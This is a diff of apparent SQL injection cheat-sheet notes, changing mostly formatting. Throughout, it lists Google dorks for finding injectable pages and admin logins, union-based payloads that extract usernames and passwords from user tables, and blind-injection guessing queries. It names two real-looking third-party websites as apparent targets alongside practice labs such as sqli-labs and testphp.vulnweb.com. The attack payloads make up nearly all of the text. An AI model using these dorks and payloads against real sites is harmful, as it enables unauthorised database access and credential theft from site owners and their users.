@@ -39,7 +39,7 @@ inurl:admin/login.php
 inurl:admin-login.php
 inurl:adminlogin.php
 *********************************************************************************************************************************************************************************
-############ Some Google dorks for sql injection ###########
+######################## Some Google dorks for sql injection #####################
 inurl:sql.php?id=
 inurl:news_view.php?id=
 inurl:select_biblio.php?id=
@@ -56,7 +56,8 @@ inurl: php?id=
 inurl: asp?id=
 inurl: net?id=
 *********************************************************************************************************************************************************************************
-____________________ ERROR & UNION SQL INJECTION __________________________
+______________________________ ERROR & UNION SQL INJECTION _______________________
+
 eg: http://vulnsite.com/news.php?id=1          :---  id=1' or id=2-1
 to provoke errors
 ?id=0X01
@@ -77,9 +78,12 @@ testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_nam
 union select 1,group_concat(uname,0x3a,pass,email),3 from users--
 
 *********************************************************************************************************************************************************************************
-################## FOR BLIND SQL #################
+################# FOR BLIND SQL #######################
+
 https://www.thaibusinessnews.com/readnews.php?id=2114
+
 https://www.hotelone.com.pk/article.php?id=15
+
 Two types of blind sql are there:- Normal Blind, Totally Blind
 
 How to check? 
@@ -96,9 +100,7 @@ and (select 1 from login limit 0,1)=1 ///Guessing method to find the table name
 and (select substring(concat(1,password),1,1) from login limit 0,1)=1 //Guessing column name
 
 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80 //checks the first character with the ascii value provided, if its true then we need to increase the value, if its false then we got the character.
-
-
-=================================================================================================================================================================================
+*********************************************************************************************************************************************************************************
 MACHINE_IP/sqli-labs/Less-8/?id=1' OR 1 < 2 --+ = True
 
 MACHINE_IP/sqli-labs/Less-8/?id=1' OR 1 > 2 --+ = False
